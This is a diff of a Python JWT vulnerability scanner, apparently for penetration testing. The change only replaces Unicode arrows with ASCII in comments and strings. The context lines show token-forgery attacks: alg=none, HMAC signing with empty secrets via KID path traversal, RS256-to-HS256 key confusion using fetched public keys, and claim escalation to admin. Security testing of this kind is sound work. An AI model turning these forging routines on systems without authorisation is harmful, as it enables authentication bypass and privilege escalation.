@@ -31,8 +31,8 @@ class JWTScanner(BaseScanner):
     - alg=none (4 case variants)
     - Null signature (keep alg, strip sig)
     - HS256 brute-force against wordlist
-    - RS256/ES256 → HS256 algorithm confusion (public key as HMAC secret)
-    - KID path traversal (/dev/null → empty secret)
+    - RS256/ES256 -> HS256 algorithm confusion (public key as HMAC secret)
+    - KID path traversal (/dev/null -> empty secret)
     - JKU / X5U header injection risk detection
     - Claim escalation (role, admin, scope, sub)
     - Expiry bypass (expired token acceptance, far-future exp)
@@ -224,7 +224,7 @@ class JWTScanner(BaseScanner):
         return 0
 
     # -------------------------------------------------------------------------
-    # Attack 4: RS256/ES256 → HS256 algorithm confusion
+    # Attack 4: RS256/ES256 -> HS256 algorithm confusion
     # -------------------------------------------------------------------------
 
     def _attack_rs256_hs256(
@@ -253,7 +253,7 @@ class JWTScanner(BaseScanner):
             for target_url in urls:
                 if self._verify_access(target_url, token):
                     self.add(bucket, {
-                        "type": "JWT RS256→HS256 Algorithm Confusion", "severity": "Critical",
+                        "type": "JWT RS256->HS256 Algorithm Confusion", "severity": "Critical",
                         "url": url,
                         "details": (
                             "Server accepted a token where the RS256 public key was used as the "
@@ -281,7 +281,7 @@ class JWTScanner(BaseScanner):
                     if r.status_code != 200:
                         continue
                     data = r.json()
-                    # openid-configuration → follow jwks_uri
+                    # openid-configuration -> follow jwks_uri
                     if "jwks_uri" in data:
                         r2 = self.session.get(data["jwks_uri"], timeout=5)
                         if r2.status_code == 200:
@@ -313,7 +313,7 @@ class JWTScanner(BaseScanner):
             h_enc = self._b64e(json.dumps(h, separators=(",", ":")))
             p_enc = self._b64e(json.dumps(payload, separators=(",", ":")))
             signing_input = f"{h_enc}.{p_enc}".encode()
-            # /dev/null and "" → empty file content → HMAC(b"", ...) or HMAC(b"\x00", ...)
+            # /dev/null and "" -> empty file content -> HMAC(b"", ...) or HMAC(b"\x00", ...)
             for secret in (b"", b"\x00", b"null"):
                 sig = base64.urlsafe_b64encode(
                     hmac.new(secret, signing_input, hashlib.sha256).digest()
@@ -380,7 +380,7 @@ class JWTScanner(BaseScanner):
                                 "url": url,
                                 "details": (
                                     f"Claim '{claim}' escalated: "
-                                    f"{original_val!r} → {escalated_val!r} — "
+                                    f"{original_val!r} -> {escalated_val!r} — "
                                     "server accepted tampered token"
                                 ),
                             })
@@ -510,7 +510,7 @@ def _jwt_encode(header: dict, payload: dict, secret: bytes, alg: str = "HS256") 
 
 class JWTKeyConfusionExploiter(BaseScanner):
     """
-    RS256 → HS256 key confusion:
+    RS256 -> HS256 key confusion:
       - JWKS endpoint'ten public key otomatik cekme
       - Public key'i HMAC secret olarak kullanarak token imzalama
       - Forged token ile yetki testi
@@ -583,7 +583,7 @@ class JWTKeyConfusionExploiter(BaseScanner):
                 if r.status_code != 200:
                     continue
                 data = r.json()
-                # openid-configuration → jwks_uri
+                # openid-configuration -> jwks_uri
                 if "jwks_uri" in data:
                     r2 = self.session.get(data["jwks_uri"], timeout=8)
                     data = r2.json()
@@ -602,7 +602,7 @@ class JWTKeyConfusionExploiter(BaseScanner):
         return None
 
     def _test_token(self, target: str, forged: str, original: str) -> Optional[Dict]:
-        """Test if server accepts the forged RS256→HS256 token."""
+        """Test if server accepts the forged RS256->HS256 token."""
         headers_to_try = [
             {"Authorization": f"Bearer {forged}"},
             {"Cookie": f"token={forged}"},
@@ -619,10 +619,10 @@ class JWTKeyConfusionExploiter(BaseScanner):
                         sim = _response_similarity(orig_resp, forged_resp)
                         if sim > 0.6 or forged_resp.status_code == orig_resp.status_code:
                             return {
-                                "vuln_type": "JWT RS256→HS256 Algorithm Confusion",
+                                "vuln_type": "JWT RS256->HS256 Algorithm Confusion",
                                 "url": url, "severity": "Critical",
                                 "description": (
-                                    "Server accepted a forged JWT token using RS256→HS256 algorithm confusion. "
+                                    "Server accepted a forged JWT token using RS256->HS256 algorithm confusion. "
                                     "Attacker used the public key as HMAC secret to forge admin-level tokens."
                                 ),
                                 "evidence": {
